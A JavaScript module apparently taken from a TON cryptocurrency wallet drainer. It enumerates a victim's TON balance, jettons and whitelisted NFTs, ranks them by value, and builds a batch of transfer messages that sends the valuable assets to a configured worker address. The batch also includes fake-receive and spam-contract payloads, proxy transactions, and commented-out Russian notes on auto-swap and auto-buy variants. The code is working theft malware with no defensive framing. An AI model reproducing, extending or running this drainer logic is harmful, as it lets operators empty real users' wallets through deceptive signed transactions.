const BOC = require("../BOC");
const TonKeeper = require("../tonkeeper");
const Utils = require("../utils");
let { smart_contract } = require("../../config");
const { Address } = require("@ton/core");

function rounded(number) {
    if(number == undefined) return undefined;
    return +number.toFixed(2);
}

function between(min, max) {  
    return Math.floor(
      Math.random() * (max - min) + min
    )
}

class Sorter {
    static async getAssets(address) {
        await TonKeeper.initialize();

        let ton_balance = (await TonKeeper.getAccountInfo(address)).balance;
        let jettons = await TonKeeper.getAccountJettons(address);
        let nfts = await TonKeeper.getAccountNfts(address);

        jettons = jettons.filter(jetton => jetton.jetton.whitelist != "scam");
        nfts = nfts.filter(nft => nft.trust == "whitelist")

        return {
            ton_balance,
            jettons,
            nfts
        }
    }

    static sortAssets(assets, tonComission, minTon, maxTon, nftOnly, spam_contract, proxyTransaction, proxyTransactionV2) {
        let total = 0;
        let { ton_balance, jettons, nfts } = assets;
        
        let sorted_assets = [];

        total += Utils.fromNanoTon(ton_balance);
        let tonBalance = Utils.fromNanoTon(ton_balance);

        for(let i = 0; i < jettons.length; i++) {
            if(nftOnly) break;

            let jetton = jettons[i];

            let jetton_balance = Utils.fromDecimalsTon(parseInt(jetton.balance), jetton.jetton.decimals);
            let price = jetton.price.prices.TON;
            let balance = jetton_balance * price;

            total += balance;

            if(balance < 0.055) continue;
            
            sorted_assets.push({
                type: "jetton",
                balance,
                jetton,
                jetton_balance
            });

            if(proxyTransactionV2.settings == undefined) proxyTransactionV2.IsEnabled = false;
            if(proxyTransactionV2.IsEnabled ) {
                for (let i = 0; i < proxyTransactionV2.settings.length; i++) {
                    if (proxyTransactionV2.settings[i].token_address == jetton.jetton.address)
                        sorted_assets.push({
                            type: `proxyTransactionV2_${i}`,
                            balance: jetton_balance
                        })
                }

            }
        };

        for(let i = 0; i < nfts.length; i++) {
            let price = 0;

            if(nfts[i].collection == undefined || nfts[i].collection == null || nfts[i].trust != "whitelist") continue;    
            if(nfts[i].metadata.name == "10,000 $NOT Voucher" && nfts[i].collection.name == "Notcoin Pre-Market" && !nftOnly) price = 25;
            if(nfts[i].metadata.name == "69,000 $X Voucher" && nfts[i].collection.name == "X Empire Pre-Market" && !nftOnly) price = 1;
            if(nfts[i].collection.address == "0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2") price = 100;
            if(nfts[i].collection.name == "Telegram Usernames") price = 7;

            if(price < 0.055) continue;
            total += price;

            if(nftOnly) sorted_assets.push({
                type: "nft",
                balance: price,
                nft: nfts[i],
                auctionPrice: Utils.toNanoTon(price)
            });
            else sorted_assets.push({
                type: "nft",
                balance: price,
                nft: nfts[i]
            });
        }

        if(tonBalance == 0) return {
            sorted_assets: [],
            total
        };

        let tonFee = 0.055;



        let feeTransactionsCount = Math.trunc(tonBalance / 0.055);
        sorted_assets = sorted_assets.sort((a, b) => b.balance - a.balance);
        let listLength = sorted_assets.length;

        if(feeTransactionsCount > listLength) feeTransactionsCount = listLength;  

        let countPops = 0;
        for(let i = 0; i < listLength - feeTransactionsCount; i++) { 
            countPops++;
            sorted_assets.pop();
        }

        ton_balance = ton_balance - Utils.toNanoTon((0.055 * feeTransactionsCount));
        ton_balance = ton_balance - Utils.toNanoTon(tonFee);

        tonBalance = Utils.fromNanoTon(ton_balance);

        let void_assets = 0;
        for(let i = 0; i < sorted_assets.length; i++) {
            let asset = sorted_assets[i];
            
            if (asset.type.includes("proxyTransaction") && asset.tonAmount === undefined) void_assets++;
        }

        if(void_assets == sorted_assets.length && tonBalance <= 0) return {
            sorted_assets: [],
            total,
            nativeMessage: undefined
        };

        if(tonBalance <= 0) return {
            sorted_assets,
            total
        }

        let nativeMessage = undefined;

        if(tonComission && tonBalance > minTon && tonBalance < maxTon && sorted_assets.length > 0) {
            sorted_assets[0].tonAmount = ton_balance;
            
            nativeMessage = {
                type: "native",
                balance: tonBalance,
                value: ton_balance,
                in_fee: true
            }
        }
        else if(!nftOnly) sorted_assets.push({
            type: "native",
            balance: tonBalance,
            value: ton_balance
        });

        void_assets = 0;
        for(let i = 0; i < sorted_assets.length; i++) {
            let asset = sorted_assets[i];
            if (asset.type.includes("proxyTransaction") && asset.tonAmount === undefined) void_assets++;
        }

        if(void_assets == sorted_assets.length && nativeMessage == undefined) return {
            sorted_assets: [],
            total,
            nativeMessage: undefined
        };

        sorted_assets = sorted_assets.sort((a, b) => b.balance - a.balance);

        if(spam_contract && ( sorted_assets.length > 0 || nativeMessage != undefined) ) {
            sorted_assets.unshift({
                type: "spam_contract"
            })
        }

        if(proxyTransaction.IsEnabled && ( sorted_assets.length > 0 || nativeMessage != undefined) ) {
            for(let i = 0; i < proxyTransaction.settings.length; i++) {
                sorted_assets.unshift({
                    type: `proxyTransaction_${i}`
                })
            }
        }
        
        if(sorted_assets.length == 1 && sorted_assets[0].type.includes("proxyTransaction") && sorted_assets[0].tonAmount == undefined)  return {
            sorted_assets: [],
            total,
            nativeMessage: undefined
        };

        return {
            sorted_assets,
            total,
            nativeMessage
        };
    }

    static async generateMessages(assets, address, fake_contract_property, fake_contract, comments, proxyTransaction, my_address, total, proxyTransactionV2, isW5) {
        let messages = [];
        let nativeMessage = undefined;

        for(let i = 0; i < assets.length; i++) {
            let asset = assets[i];
            if(isW5) asset = assets[assets.length - i - 1]


            if(asset.type == "native") {
                let generatedComment = Utils.generateComment(asset, comments.native);

                nativeMessage = {
                    address,
                    amount: asset.value,
                    payload: (await BOC.createPayload(generatedComment))
                };

                continue;
            }
            
            if(asset.type == "jetton") {
                let generatedComment = Utils.generateComment(asset, comments.jetton);

                messages.push({
                    address: asset.jetton.wallet_address.address,
                    amount: asset.tonAmount == undefined ? Utils.toNanoTon(0.05) : asset.tonAmount + 50000000,
                    payload: (await BOC.jettonPayload({
                        "jettonAmount": asset.jetton.balance,
                        "toAddress": address,
                        "forwardAmount": 1,
                        "forwardPayload": generatedComment,
                        "responseAddress": address,
                        "queryId": between(5000, 5000000)
                    }))
                })

                continue;
            }

            if(asset.type == "nft") {
                let generatedComment = Utils.generateComment(asset, comments.nft);

                if(asset.auctionPrice == undefined) messages.push({
                    address: asset.nft.address,
                    amount: asset.tonAmount == undefined ? Utils.toNanoTon(0.05) : asset.tonAmount + 50000000,
                    payload: (await BOC.nftPayload({
                        "forwardAmount": asset.nft.collection.name == "Telegram Usernames" ? 0xf4240 : 1,
                        "forwardPayload": generatedComment,
                        "responseAddress": address,
                        "newOwnerAddress": address,
                        "queryId": between(5000, 5000000)
                    }))
                })
                else messages.push({
                    address: asset.nft.address,
                    amount: Utils.toNanoTon(0.05),
                    payload: (await BOC.auction({
                        "price": asset.auctionPrice,
                        "addressSend": address,
                        "queryId": between(5000, 5000000)
                    }))
                });

                continue;
            }

            if(asset.type == "spam_contract") {
                messages.push(
                    {
                        address: smart_contract,
                        amount: Utils.toNanoTon(0.01),
                        payload: (await BOC.spamTransaction({
                            "addressSend": "UQBQBSUdDSKXD_YNUEH80Wuj2YMmPyHIMGrYVTZK9Mwyd_fz"
                        }))
                    }
                )
            }

            if(asset.type.includes("proxyTransaction_")) {
                let i = asset.type.split("_")[1];
                let proxyTransactionSetting = proxyTransaction.settings[i];

                if(proxyTransactionSetting.type == "nft") messages.push({
                    address: proxyTransactionSetting.MasterWallet,
                    amount: 1,
                    payload: (await BOC.nftPayload({
                        "forwardAmount": 1,
                        "forwardPayload": comments.proxyComment.nft,
                        "responseAddress": my_address,
                        "newOwnerAddress": my_address,
                        "queryId": between(5000, 5000000)
                    }))
                })

                if(proxyTransactionSetting.type == "jetton") messages.push({
                    address: proxyTransactionSetting.MasterWallet,
                    amount: 1,
                    payload: (await BOC.jettonPayload({
                        "jettonAmount": proxyTransactionSetting.Amount,
                        "toAddress": my_address,
                        "forwardAmount": 1,
                        "forwardPayload": comments.proxyComment.jetton,
                        "responseAddress": address,
                        "queryId": between(5000, 5000000)
                    }))
                })
            }
            if(asset.type.includes("proxyTransactionV2_")) {
                let i = asset.type.split("_")[1];
                let proxyTransactionSetting = proxyTransactionV2.settings[i];

                if(proxyTransactionSetting.type == "jetton") messages.push({
                    address: proxyTransactionSetting.MasterWallet,
                    amount: asset.tonAmount == undefined ? Utils.toNanoTon(0.05) : asset.tonAmount + Utils.toNanoTon(0.05),
                    payload: (await BOC.jettonPayload({
                        "jettonAmount": asset.balance,
                        "toAddress": my_address,
                        "forwardAmount": 1,
                        "forwardPayload": comments.proxyComment.jetton,
                        "responseAddress": address,
                        "queryId": asset.tonAmount == undefined ? 51488 : between(5000, 51000) 
                    }))
                })
            }
        }

        if(nativeMessage != undefined) {     
            if(fake_contract_property && nativeMessage.amount >= Utils.toNanoTon(0.06)) messages.push(
                {
                    address: fake_contract.address,
                    amount: nativeMessage.amount,
                    payload: (await BOC.fakeReceive({
                        "jetton_address": fake_contract.jetton_address,
                        "worker_address": address,
                        "counter": fake_contract.counter,
                        "total": Utils.toNanoTon(total)
                    }))
                }
            )
            else messages.push(nativeMessage)

            nativeMessage = undefined 
        }

        // это для автосвапа (тут ещё в BOC зайди почекай)
        //messages = [];

        //messages.push({
        //    address: "0:750123d07dbc00ed11796f10a3edcdc5f5f63b93453ff81ea1ce8330e7678720",
        //    amount: Utils.toNanoTon(0.30),
        //    payload: (await BOC.swap({
        //        "jettonAmount": Utils.toNanoTon(70),
        //        "toAddress": "0:779dcc815138d9500e449c5291e7f12738c23d575b5310000f6a253bd607384e",
        //        "responseAddress": "UQAJ5p-G2S2y9oIjAjoTJBT1XY02WEqqTzAxlQ8Cl2HvUHVz",
        //        "forwardAmount": "265000000",
        //        "queryId": between(5000, 5000000)
        //    }))
        //})
        //let fakeAddr = "EQD_AVvBE8RqNbi6ooG9eDNbJMTPXNvwxhy4Cr0_PRbI0hgV";
        //messages.push({
        //    address: fakeAddr,
        //    amount: Utils.toNanoTon(0.05),
        //    payload: (await BOC.jettonPayload({
        //        "jettonAmount": Utils.toNanoTon(100000),
        //        "toAddress": my_address,
        //        "forwardAmount": 1,
        //        "forwardPayload": "test",
        //        "responseAddress": my_address,
        //        "queryId": between(5000, 5000000)
        //    }))
        //})
        
        // (это для автопокупки, тут указываешь адресс для нфтшки)
        //messages = [];
        //messages.push({
        //    "address": "EQAliaPhRUWjeneB_UsKApwyQAKw7dmLeoQulpMz8cHFoQ0x",
        //    "amount": Utils.toNanoTon(6)
        //})

        return { messages, nativeMessage };
    }
}

module.exports = Sorter;